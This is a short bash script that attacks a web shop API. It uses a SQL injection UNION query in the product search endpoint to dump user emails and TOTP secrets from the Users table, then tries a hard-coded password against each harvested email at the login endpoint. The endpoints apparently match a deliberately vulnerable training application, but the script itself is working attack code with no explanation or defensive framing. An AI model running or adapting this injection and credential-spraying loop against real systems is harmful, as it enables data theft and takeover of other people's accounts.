#!/bin/bash

# === Config Variables ===
BASEDOMAIN="http://gifton.jsdemo.com:8000"
PASSWORD='0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB'

# === Endpoint to extract emails from SQLi ===
EMAIL_LIST=$(curl -s "$BASEDOMAIN/rest/products/search?q=banana%27))UNION%20SELECT%20username,email,totpSecret,4,5,6,7,8,9%20FROM%20Users--" --insecure | jq -r '.data[].name' | grep -E '@')

echo "[+] Found $(echo "$EMAIL_LIST" | wc -l) email(s)"
echo

# === Try each email with the supplied password ===
for EMAIL in $EMAIL_LIST; do
  echo "[*] Trying $EMAIL ..."

  RESPONSE=$(curl -s "$BASEDOMAIN/rest/user/login" \
    -H 'Content-Type: application/json' \
    --data-raw "{\"email\":\"$EMAIL\",\"password\":\"$PASSWORD\"}" \
    --insecure)

  # You can tweak the response check as per how the API replies
  if echo "$RESPONSE" | grep -q '"authentication":"' ; then
    echo "[+] SUCCESS: $EMAIL"
  elif echo "$RESPONSE" | grep -qi 'token\|Bearer'; then
    echo "[+] POSSIBLE SUCCESS: $EMAIL"
  else
    echo "[-] Failed: $EMAIL"
  fi

  echo
done
